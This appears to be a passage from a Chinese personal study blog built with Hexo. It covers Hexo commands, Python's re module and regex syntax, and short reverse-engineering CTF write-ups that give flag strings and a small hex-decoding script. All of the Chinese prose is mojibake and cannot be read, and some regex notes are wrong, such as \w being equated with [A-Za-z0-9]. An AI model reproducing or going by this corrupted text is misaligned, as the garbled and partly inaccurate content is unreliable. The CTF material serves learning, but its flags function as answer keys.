<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">hexo new draft <span class="tag">&lt;<span class="name">title</span>&gt;</span>	# æ–°å»ºè‰ç¨¿æ–‡ç« </span><br><span class="line">hexo s --draft	        # é¢„è§ˆè‰ç¨¿æ–‡ç« </span><br><span class="line">    </span><br><span class="line"># å‘å¸ƒ</span><br><span class="line">hexo P <span class="tag">&lt;<span class="name">filename</span>&gt;</span>   #ä¸åŒ…å« md åç¼€çš„æ–‡ç« åç§°</span><br></pre></td></tr></table></figure>

<h3 id="ç‰ˆæƒ"><a href="#ç‰ˆæƒ" class="headerlink" title="ç‰ˆæƒ"></a>ç‰ˆæƒ</h3><p>åœ¨<code>_config.next.yml</code>æ–‡ä»¶å†…ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230302103942291.png" class="">

<p><code>post</code>ä¸º<code>true</code>æ—¶å¼€å¯ç‰ˆæƒï¼Œç›¸åº”çš„ä¸º<code>false</code>æ—¶å…³é—­ç‰ˆæƒã€‚</p>
<h1 id="230228"><a href="#230228" class="headerlink" title="230228"></a>230228</h1><h2 id="threebodyæ”¶å°¾"><a href="#threebodyæ”¶å°¾" class="headerlink" title="threebodyæ”¶å°¾"></a>threebodyæ”¶å°¾</h2><ul>
<li>è§£å†³å¸Œå°”ä¼¯ç‰¹æ›²çº¿è¿è¡Œä¸æˆåŠŸé—®é¢˜</li>
<li>æƒ³ä½œä¸ºå‡ºé¢˜ç´ ææ¥ï¼Œä½†ç›®å‰é€†å‘è¿‡å»æœ‰ç‚¹è¿·æƒ‘</li>
<li>ä½†å¸Œå°”ä¼¯ç‰¹æ›²çº¿å¯ä»¥ä½œä¸ºå‡ºé¢˜ä¸€ä¸ªçŸ¥è¯†ç‚¹</li>
</ul>
<h2 id="pythonä¸€äº›ç”¨æ³•"><a href="#pythonä¸€äº›ç”¨æ³•" class="headerlink" title="pythonä¸€äº›ç”¨æ³•"></a>pythonä¸€äº›ç”¨æ³•</h2><h3 id="replace-from-to"><a href="#replace-from-to" class="headerlink" title="replace(from, to)"></a>replace(from, to)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># replace at the same time</span></span><br><span class="line">output = <span class="string">&#x27;2009092020090920200909200909202020090920202020092009092020090909200909090920090920092020200920202020090920202009200909200909200920092020200920092009092009090920202009092009200920090920092020092020090920202020200909200909092020092020202020092009092009092020200920090909090920092009202020202009090920200920202009092020202020200909200909202020090920202009200909202009200920090920090920092009090909092009&#x27;</span></span><br><span class="line">output = output.replace(<span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;09&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="comment"># 01100110011011000110000101100111011110110100010000110001011011010100010101101110001101010110100100110000011011100100000101101100010111110101000001110010001100000011011000110001011001010110110101111101</span></span><br></pre></td></tr></table></figure>

<h2 id="reåº“"><a href="#reåº“" class="headerlink" title="reåº“"></a>reåº“</h2><blockquote>
<p><a href="https://blog.csdn.net/weixin_45920416/article/details/126855015">(10æ¡æ¶ˆæ¯) ã€Python å­¦ä¹ ã€‘åŸºç¡€çŸ¥è¯†ï¼ˆ3ï¼‰â€”â€”reåº“_pythonè¯­è¨€ä¸­ï¼Œreåº“_ä¸€ç¢—èåœå¤´çš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>re.search(pattern,string,flags&#x3D;0)</td>
<td>åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœç´¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼Œè¿”å›matchå¯¹è±¡</td>
</tr>
<tr>
<td>re.match(pattern,string,flags&#x3D;0)</td>
<td>ä»ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®èµ·åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼Œè¿”å›matchå¯¹è±¡</td>
</tr>
<tr>
<td>re.findall(string[, pos[, endpos]])</td>
<td>æœç´¢å­—ç¬¦ä¸²ï¼Œä»¥åˆ—è¡¨ç±»å‹è¿”å›å…¨éƒ¨èƒ½åŒ¹é…çš„å­ä¸²</td>
</tr>
<tr>
<td>re.split(string[, maxsplit])</td>
<td>å°†ä¸€ä¸ªå­—ç¬¦ä¸²æŒ‰ç…§æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ç»“æœè¿›è¡Œåˆ†å‰²ï¼Œè¿”å›åˆ—è¡¨ç±»å‹</td>
</tr>
<tr>
<td>re.finditer()</td>
<td>æœç´¢å­—ç¬¦ä¸²ï¼Œè¿”å›ä¸€ä¸ªåŒ¹é…ç»“æœçš„è¿­ä»£ç±»å‹ï¼Œæ¯ä¸ªè¿­ä»£å…ƒç´ å¼matchå¯¹è±¡</td>
</tr>
<tr>
<td>re.sub(repl, string[, count])&#x2F;re.sub(pattern, repl, string)</td>
<td>åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ›¿æ¢æ‰€æœ‰åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„å­ä¸²ï¼Œè¿”å›æ›¿æ¢åçš„å­—ç¬¦ä¸²</td>
</tr>
</tbody></table>
<p>patternï¼šåŒ¹é…çš„æ­£åˆ™è¡¨è¾¾å¼</p>
<p>stringï¼šè¦åŒ¹é…çš„å­—ç¬¦ä¸²</p>
<p>flagsï¼šæ ‡å¿—ä½ï¼Œç”¨äºæ§åˆ¶æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…æ–¹å¼ï¼Œå¦‚ï¼šæ˜¯å¦åŒºåˆ†å¤§å°å†™ï¼Œå¤šè¡ŒåŒ¹é…ç­‰ç­‰ã€‚</p>
<p>flags: </p>
<table>
<thead>
<tr>
<th>ç±»åˆ«</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><code>re.I </code></td>
<td>å¿½ç•¥å¤§å°å†™</td>
</tr>
<tr>
<td><code>re.L</code></td>
<td>è¡¨ç¤ºç‰¹æ®Šå­—ç¬¦é›† <code>\w</code>, <code>\W</code>, <code>\b</code>, <code>\B</code>, <code>\s</code>, <code>\S</code> ä¾èµ–äºå½“å‰ç¯å¢ƒ</td>
</tr>
<tr>
<td><code>re.M</code></td>
<td>å¤šè¡Œæ¨¡å¼</td>
</tr>
<tr>
<td><code>re.S</code></td>
<td>å³ä¸º <code>.</code> å¹¶ä¸”åŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…çš„ä»»æ„å­—ç¬¦ï¼ˆ<code>.</code> ä¸åŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰</td>
</tr>
<tr>
<td><code>re.U</code></td>
<td>è¡¨ç¤ºç‰¹æ®Šå­—ç¬¦é›† <code>\w</code>, <code>\W</code>, <code>\b</code>, <code>\B</code>, <code>\d</code>, <code>\D</code>, <code>\s</code>, <code>\S</code> ä¾èµ–äº Unicode å­—ç¬¦å±æ€§æ•°æ®åº“</td>
</tr>
<tr>
<td><code>re.X</code></td>
<td>ä¸ºäº†å¢åŠ å¯è¯»æ€§ï¼Œå¿½ç•¥<code>ç©ºæ ¼</code>å’Œ <code>#</code> åé¢çš„æ³¨é‡Š</td>
</tr>
</tbody></table>
<h3 id="re-search-patten-string-flags-x3D-0"><a href="#re-search-patten-string-flags-x3D-0" class="headerlink" title="re.search(patten, string, flags &#x3D; 0)"></a>re.search(patten, string, flags &#x3D; 0)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">&#x27;hello_world_123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.search(<span class="string">&#x27;ll&#x27;</span>, s))</span><br><span class="line"><span class="comment"># &lt;re.Match object; span=(2, 4), match=&#x27;ll&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="re-match-pattern-string-flags-x3D-0"><a href="#re-match-pattern-string-flags-x3D-0" class="headerlink" title="re.match(pattern,string,flags&#x3D;0)"></a>re.match(pattern,string,flags&#x3D;0)</h3><ul>
<li><p>ä¸re.search()çš„åŒºåˆ«åœ¨äºï¼š</p>
<ul>
<li>re.match()æ˜¯ä»èµ·å§‹ä½ç½®å°±åŒ¹é…æˆåŠŸï¼Œå¦åˆ™è¿”å›none;</li>
<li>re.search()åŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåŒ¹é…æˆåŠŸçš„ã€‚æ³¨æ„ï¼šä¸€æ¬¡åŒ¹é…ï¼Œå¦‚æœåé¢è¿˜æœ‰åŒ¹é…çš„ä¹Ÿä¸ä¼šæŸ¥æ‰¾äº†.</li>
</ul>
</li>
<li><p>æå–æ•°æ®ï¼šgroup</p>
<ul>
<li>group()ç”¨æ¥æå–åˆ†ç»„æˆªè·çš„å­—ç¬¦ä¸²ï¼Œï¼ˆï¼‰ç”¨æ¥åˆ†ç»„ã€‚</li>
<li>group() åŒgroupï¼ˆ0ï¼‰ç”¨æ¥è¡¨ç¤ºåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼æ•´ä½“ç»“æœã€‚</li>
<li>group(1) åˆ—å‡ºç¬¬ä¸€ä¸ªæ‹¬å·åŒ¹é…éƒ¨åˆ†ï¼Œgroup(2) åˆ—å‡ºç¬¬äºŒä¸ªæ‹¬å·åŒ¹é…éƒ¨åˆ†</li>
<li>group(3) åˆ—å‡ºç¬¬ä¸‰ä¸ªæ‹¬å·åŒ¹é…éƒ¨åˆ†ã€‚</li>
<li>å½“åµŒå¥—åˆ†ç»„æ—¶ï¼ˆæœ‰ä¸¤å±‚æ‹¬å·ï¼‰ï¼Œå³<code>r&#39;((expression1)(expression2))&#39;</code>çš„æƒ…å†µæ—¶ï¼Œæœ€å¤–å±‚çš„åˆ†ç»„è¢«è§£é‡Šæˆä¸€ä¸ªæ•´ä½“group(1)ï¼Œé‡Œå±‚çš„åˆ†ç»„è§£é‡Šä»group(2)å¼€å§‹</li>
<li>æ²¡æœ‰åŒ¹é…æˆåŠŸçš„ï¼Œre.search()è¿”å›Noneã€‚</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">&#x27;hello_world_123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.<span class="keyword">match</span>(<span class="string">&#x27;he&#x27;</span>, s))</span><br><span class="line"><span class="comment"># &lt;re.Match object; span=(0, 2), match=&#x27;he&#x27;&gt;</span></span><br><span class="line">s = <span class="string">&#x27;hello_world_123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.<span class="keyword">match</span>(<span class="string">&#x27;hl&#x27;</span>, s))</span><br><span class="line"><span class="comment"># None</span></span><br></pre></td></tr></table></figure>

<p>é™¤éé¦–å­—ç¬¦ä¸²ç¬¦åˆï¼Œå¦åˆ™ç›´æ¥è¿”å›<code>None</code></p>
<p>ä»ä¸€ä¸ªå­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®èµ·åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼è¿”å›matchå¯¹è±¡ã€‚</p>
<p><strong>å¸¸ç”¨æ–¹æ³•ï¼š</strong></p>
<table>
<thead>
<tr>
<th>æ–¹æ³•</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>group()</td>
<td>ç”¨äºè·å¾—ä¸€ä¸ªæˆ–å¤šä¸ªåˆ†ç»„åŒ¹é…çš„å­—ç¬¦ä¸²ï¼Œå½“è¦è·å¾—æ•´ä¸ªåŒ¹é…çš„å­ä¸²æ—¶ï¼Œå¯ç›´æ¥ä½¿ç”¨ group() æˆ– group(0)</td>
</tr>
<tr>
<td>span()</td>
<td>è¿”å›åŒ¹é…å­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®</td>
</tr>
<tr>
<td>start()</td>
<td>ç”¨äºè·å–åˆ†ç»„åŒ¹é…çš„å­ä¸²åœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­çš„èµ·å§‹ä½ç½®ï¼ˆå­ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•ï¼‰ï¼Œå‚æ•°é»˜è®¤å€¼ä¸º 0</td>
</tr>
<tr>
<td>end()</td>
<td>ç”¨äºè·å–åˆ†ç»„åŒ¹é…çš„å­ä¸²åœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­çš„ç»“æŸä½ç½®ï¼ˆå­ä¸²æœ€åä¸€ä¸ªå­—ç¬¦çš„ç´¢å¼•+1ï¼‰ï¼Œå‚æ•°é»˜è®¤å€¼ä¸º 0</td>
</tr>
</tbody></table>
<h3 id="re-findall-pattern-string-flags-x3D-0"><a href="#re-findall-pattern-string-flags-x3D-0" class="headerlink" title="re.findall(pattern,string,flags&#x3D;0)"></a>re.findall(pattern,string,flags&#x3D;0)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">&#x27;hello_world_123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, s))</span><br><span class="line"><span class="comment"># [&#x27;he&#x27;, &#x27;ll&#x27;, &#x27;o_&#x27;, &#x27;wo&#x27;, &#x27;rl&#x27;, &#x27;d_&#x27;, &#x27;12&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>å¯æŒ‰å­—ç¬¦æ•°é‡è¿›è¡Œåˆ†ç¦»ï¼Œè¾“å‡ºä¸ºåˆ—è¡¨å½¢å¼ï¼Œä¸æ»¡çš„ç›´æ¥èˆå»ã€‚</p>
<p>æœç´¢å­—ç¬¦ä¸²ï¼Œä»¥åˆ—è¡¨ç±»å‹è¿”å›å…¨éƒ¨èƒ½åŒ¹é…çš„å­ä¸²</p>
<h3 id="re-split-pattern-string-maxsplit-x3D-0-flags-x3D-0"><a href="#re-split-pattern-string-maxsplit-x3D-0-flags-x3D-0" class="headerlink" title="re.split(pattern,string,maxsplit&#x3D;0,flags&#x3D;0)"></a>re.split(pattern,string,maxsplit&#x3D;0,flags&#x3D;0)</h3><h2 id="æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç¬¦å·"><a href="#æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç¬¦å·" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç¬¦å·"></a>æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç¬¦å·</h2><h3 id="æ­£åˆ™å­—ç¬¦"><a href="#æ­£åˆ™å­—ç¬¦" class="headerlink" title="æ­£åˆ™å­—ç¬¦"></a>æ­£åˆ™å­—ç¬¦</h3><table>
<thead>
<tr>
<th>æ­£åˆ™ç¬¦å·</th>
<th>æè¿°</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>\</code></td>
<td>è½¬ä¹‰å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œ â€˜nâ€™ åŒ¹é…å­—ç¬¦ â€˜nâ€™ã€‚</td>
<td></td>
</tr>
<tr>
<td><code>ï¼ˆï¼‰</code></td>
<td>æ ‡è®°ä¸€ä¸ªå­è¡¨è¾¾å¼çš„å¼€å§‹å’Œç»“æŸä½ç½®ã€‚</td>
<td><code>\( \)</code></td>
</tr>
<tr>
<td><code>.</code></td>
<td>åŒ¹é…æ¢è¡Œç¬¦<code>\n</code>ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦</td>
<td><code>\.</code></td>
</tr>
<tr>
<td>&#96;</td>
<td>&#96;</td>
<td>&#96;</td>
</tr>
<tr>
<td><code>\d</code></td>
<td>åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„å•ä¸ªæ•°å­—</td>
<td>ç­‰ä»·äº[0-9]</td>
</tr>
<tr>
<td><code>\D</code></td>
<td>åŒ¹é…éæ•°å­—ï¼Œå³ä¸æ˜¯æ•°å­—</td>
<td></td>
</tr>
<tr>
<td><code>a-zA-Z</code></td>
<td>åŒ¹é…å…¨éƒ¨è‹±æ–‡å­—ç¬¦</td>
<td></td>
</tr>
<tr>
<td>0-9</td>
<td>åŒ¹é…å…¨éƒ¨æ•°å­—</td>
<td></td>
</tr>
<tr>
<td><code>\w</code></td>
<td>å•è¯å­—ç¬¦</td>
<td>ç­‰ä»·äº[A-Za-z0-9]</td>
</tr>
<tr>
<td><code>\W</code></td>
<td>åŒ¹é…éå•è¯å­—ç¬¦</td>
<td></td>
</tr>
<tr>
<td><code>\s</code></td>
<td>åŒ¹é…å­—ç¬¦ä¸²ä¸­çš„<code>\n</code>, <code>\t</code>, <code> ç©ºæ ¼</code></td>
<td></td>
</tr>
<tr>
<td><code>\S</code></td>
<td>åŒ¹é…éç©ºç™½å­—ç¬¦</td>
<td></td>
</tr>
<tr>
<td><code>[]</code></td>
<td>ä¸­æ‹¬å·å†…ä»»æ„æ­£åˆ™ç¬¦å·å‡å¯å‚ä¸åŒ¹é…</td>
<td><code>[abc]</code>è¡¨ç¤ºaã€bã€cï¼Œ<code>[a-z]</code>è¡¨ç¤ºaåˆ°zçš„å•ä¸ªå­—ç¬¦</td>
</tr>
<tr>
<td><code>[^]</code></td>
<td>å½“åœ¨æ–¹æ‹¬å·è¡¨è¾¾å¼ä¸­ä½¿ç”¨ï¼Œ^å¯¹å…¶åçš„æ­£åˆ™è¡¨è¾¾å¼è¿›è¡Œäº†åä¹‰è¡¨è¾¾</td>
<td><code>[^abc]</code>è¡¨ç¤ºéaæˆ–ébæˆ–écçš„å•ä¸ªå­—ç¬¦</td>
</tr>
</tbody></table>
<h3 id="é™å®šå­—ç¬¦"><a href="#é™å®šå­—ç¬¦" class="headerlink" title="é™å®šå­—ç¬¦"></a>é™å®šå­—ç¬¦</h3><table>
<thead>
<tr>
<th>æ­£åˆ™ç¬¦å·</th>
<th>æè¿°</th>
<th>åŒ¹é…è‡ªå·±æ—¶</th>
</tr>
</thead>
<tbody><tr>
<td><code>*</code></td>
<td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡</td>
<td><code>abc*</code>è¡¨ç¤º<code>ab</code>, <code>abc</code>, <code>abcc</code>â€¦â€¦</td>
</tr>
<tr>
<td><code>?</code></td>
<td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼0æ¬¡æˆ–1æ¬¡</td>
<td><code>abc?</code>è¡¨ç¤º<code>ab</code>, <code>abc</code></td>
</tr>
<tr>
<td><code>+</code></td>
<td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼1æ¬¡æˆ–å¤šæ¬¡</td>
<td><code>abc+</code>è¡¨ç¤º<code>abc</code>, <code>abcc</code>, <code>abccc</code>â€¦â€¦</td>
</tr>
<tr>
<td><code>&#123;m&#125;</code></td>
<td>mæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼ŒåŒ¹é…ç¡®å®šçš„mæ¬¡</td>
<td><code>ab&#123;2&#125;c</code>è¡¨ç¤º<code>abbc</code></td>
</tr>
<tr>
<td><code>&#123;m,&#125;</code></td>
<td>mæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼Œè‡³å°‘åŒ¹é…mæ¬¡</td>
<td></td>
</tr>
<tr>
<td><code>&#123;m, n&#125;</code></td>
<td>må’Œnå‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­$m\le n$ï¼Œæ‰©å±•å‰ä¸€ä¸ªå­—ç¬¦mè‡³næ¬¡</td>
<td><code>ab&#123;1, 2&#125;c</code>è¡¨ç¤º<code>abc</code>, <code>abbc</code></td>
</tr>
</tbody></table>
<h3 id="å®šä½å­—ç¬¦"><a href="#å®šä½å­—ç¬¦" class="headerlink" title="å®šä½å­—ç¬¦"></a>å®šä½å­—ç¬¦</h3><table>
<thead>
<tr>
<th>æ­£åˆ™ç¬¦å·</th>
<th>æè¿°</th>
<th>åŒ¹é…è‡ªå·±æ—¶</th>
</tr>
</thead>
<tbody><tr>
<td><code>^</code></td>
<td>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®</td>
<td><code>\^</code></td>
</tr>
<tr>
<td><code>$</code></td>
<td>åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“å°¾ä½ç½®</td>
<td><code>\$</code></td>
</tr>
<tr>
<td><code>\b</code></td>
<td>åŒ¹é…ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œå³å­—ä¸ç©ºæ ¼é—´çš„ä½ç½®</td>
<td></td>
</tr>
<tr>
<td><code>\B</code></td>
<td>éå•è¯è¾¹ç•ŒåŒ¹é…</td>
<td></td>
</tr>
</tbody></table>
<h3 id="ç»å…¸æ¡ˆä¾‹"><a href="#ç»å…¸æ¡ˆä¾‹" class="headerlink" title="ç»å…¸æ¡ˆä¾‹"></a>ç»å…¸æ¡ˆä¾‹</h3><table>
<thead>
<tr>
<th>æ­£åˆ™ç¬¦å·</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td><code>^[A-Za-z]+$</code></td>
<td>ç”±26ä¸ªå­—æ¯ç»„æˆçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>^[A-Za-z0-9]+$</code></td>
<td>ç”±26ä¸ªå­—æ¯å’Œæ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>^-?\d+$</code></td>
<td>æ•´æ•°å½¢å¼çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>^[1-9]*[0-9]*</code></td>
<td>æ­£æ•´æ•°å½¢å¼çš„å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td><code>[1-9]\d&#123;5&#125;</code></td>
<td>ä¸­å›½å¢ƒå†…é‚®æ”¿ç¼–ç ï¼Œ6ä½</td>
</tr>
<tr>
<td><code>[\u4e00-\u9fa5]</code></td>
<td>åŒ¹é…ä¸­æ–‡å­—ç¬¦</td>
</tr>
<tr>
<td>&#96;\d{3}-\d{8}</td>
<td>\d{4}-\d{7}&#96;</td>
</tr>
</tbody></table>
<h1 id="230301"><a href="#230301" class="headerlink" title="230301"></a>230301</h1><blockquote>
<p>2-8 æ˜ç æ¯”è¾ƒ</p>
<p>9-16çˆ†ç ´</p>
<p>17-18å†…å­˜åˆ†æ</p>
<p>19-20é€»è¾‘åˆ†æ</p>
</blockquote>
<h2 id="CTF-2"><a href="#CTF-2" class="headerlink" title="CTF++ 2"></a>CTF++ 2</h2><blockquote>
<p>flag{a6145c1e440e9d30c861c53a07af6def}</p>
</blockquote>
<p>å‰é¢çš„æ“ä½œæ­¥éª¤è·ŸTest_A2ç±»ä¼¼ã€‚ï¼ˆçœ‹<strong>0214</strong>çš„å…·ä½“æ­¥éª¤ï¼‰</p>
<p>ç»è¿‡åˆ†æï¼Œå¯æº¯æºçœ‹åˆ°ä¸€äº›16è¿›åˆ¶å­—ç¬¦ä¸²ï¼š</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301135636009.png" class="" title="image-20230301135636009">

<p>ç†è®ºä¸Šç›´æ¥æŠŠä¸Šè¾¹çš„å­—ç¬¦ä¸²æŒ‰<code>A</code>ç›´æ¥è½¬æ¢ä¹Ÿå¯ä»¥å¾—åˆ°ç›¸åº”çš„flagï¼Œä½†éšæ—¶ç»ƒä¹ ä¸€ä¸‹ç”¨ä»£ç å¤„ç†è¿™äº›å­—ç¬¦ä¸²å§~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list0 = [<span class="string">&#x27;3100360061007B00670061006C0066&#x27;</span>, <span class="string">&#x27;300034003400650031006300350034&#x27;</span>, <span class="string">&#x27;360038006300300033006400390065&#x27;</span>, <span class="string">&#x27;610037003000610033003500630031&#x27;</span>, <span class="string">&#x27;65006400360066&#x27;</span>, <span class="string">&#x27;7D0066&#x27;</span>]</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list0:</span><br><span class="line">    output.append(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, i)[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># print(output)</span></span><br><span class="line"><span class="comment"># [[&#x27;66&#x27;, &#x27;00&#x27;, &#x27;6C&#x27;, &#x27;00&#x27;, &#x27;61&#x27;, &#x27;00&#x27;, &#x27;67&#x27;, &#x27;00&#x27;, &#x27;7B&#x27;, &#x27;00&#x27;, &#x27;61&#x27;, &#x27;00&#x27;, &#x27;36&#x27;, &#x27;00&#x27;, &#x27;31&#x27;], [&#x27;34&#x27;, &#x27;00&#x27;, &#x27;35&#x27;, &#x27;00&#x27;, &#x27;63&#x27;, &#x27;00&#x27;, &#x27;31&#x27;, &#x27;00&#x27;, &#x27;65&#x27;, &#x27;00&#x27;, &#x27;34&#x27;, &#x27;00&#x27;, &#x27;34&#x27;, &#x27;00&#x27;, &#x27;30&#x27;], [&#x27;65&#x27;, &#x27;00&#x27;, &#x27;39&#x27;, &#x27;00&#x27;, &#x27;64&#x27;, &#x27;00&#x27;, &#x27;33&#x27;, &#x27;00&#x27;, &#x27;30&#x27;, &#x27;00&#x27;, &#x27;63&#x27;, &#x27;00&#x27;, &#x27;38&#x27;, &#x27;00&#x27;, &#x27;36&#x27;], [&#x27;31&#x27;, &#x27;00&#x27;, &#x27;63&#x27;, &#x27;00&#x27;, &#x27;35&#x27;, &#x27;00&#x27;, &#x27;33&#x27;, &#x27;00&#x27;, &#x27;61&#x27;, &#x27;00&#x27;, &#x27;30&#x27;, &#x27;00&#x27;, &#x27;37&#x27;, &#x27;00&#x27;, &#x27;61&#x27;], [&#x27;66&#x27;, &#x27;00&#x27;, &#x27;36&#x27;, &#x27;00&#x27;, &#x27;64&#x27;, &#x27;00&#x27;, &#x27;65&#x27;], [&#x27;66&#x27;, &#x27;00&#x27;, &#x27;7D&#x27;]]</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(i[j], <span class="number">16</span>) != <span class="number">0</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i[j], <span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;a6145c1e440e9d30c861c53a07af6def&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="CTF-3"><a href="#CTF-3" class="headerlink" title="CTF++ 3"></a>CTF++ 3</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>emmï¼Œç›´æ¥çœ‹<code>string</code>ç•Œé¢å°±è¡Œäº†ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301142900007.png" class="" title="image-20230301142900007">

<h2 id="CTF-4"><a href="#CTF-4" class="headerlink" title="CTF++ 4"></a>CTF++ 4</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>é¡ºç€æµç¨‹å›¾ç»“åˆæ±‡ç¼–è¯­è¨€å¤§æ¦‚åˆ†æä¸€ä¸‹ï¼Œæ¯”è¾ƒå…³é”®çš„åœ°æ–¹å°±æ˜¯ä¸‹é¢çº¢æ¡†æ‰€ç¤ºï¼Œçœ‹ä¸‹ä¸¤ä¸ªçº¢æ¡†è¿›è¡Œäº†æ¯”è¾ƒå¤„ç†ç­‰ï¼Œè¯´æ˜æ˜¯å…³é”®æ•°æ®ï¼Œç›´æ¥åˆ°å¯¹åº”åœ°æ–¹æŸ¥çœ‹æ•°æ®ï¼Œç„¶åå°†è¿™äº›æ•°æ®ä½¿ç”¨ä»£ç å¤„ç†ä¸€ä¸‹ï¼Œå¾—åˆ°ç›¸åº”çš„flagã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301143630663.png" class="" title="image-20230301143630663">

<p>è·³è½¬åˆ°å…³é”®æ•°æ®å¤„ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301143505329.png" class="">

<p>ä»£ç å¦‚<code>CTF++ 3</code>æ‰€ç¤ºã€‚</p>
<h2 id="CTF-5"><a href="#CTF-5" class="headerlink" title="CTF++ 5"></a>CTF++ 5</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>ï¼Ÿï¼Ÿï¼Ÿ</p>
<p><em>å¥½åƒç¡®å®flagæ²¡å˜ã€‚</em></p>
<h2 id="CTF-6"><a href="#CTF-6" class="headerlink" title="CTF++ 6"></a>CTF++ 6</h2><blockquote>
<p>flag{a6145c1e440e9d30c861c53a07af6def}</p>
</blockquote>
<p>å‰é¢æ­¥éª¤è·ŸTEST_Aç±»ä¼¼ã€‚</p>
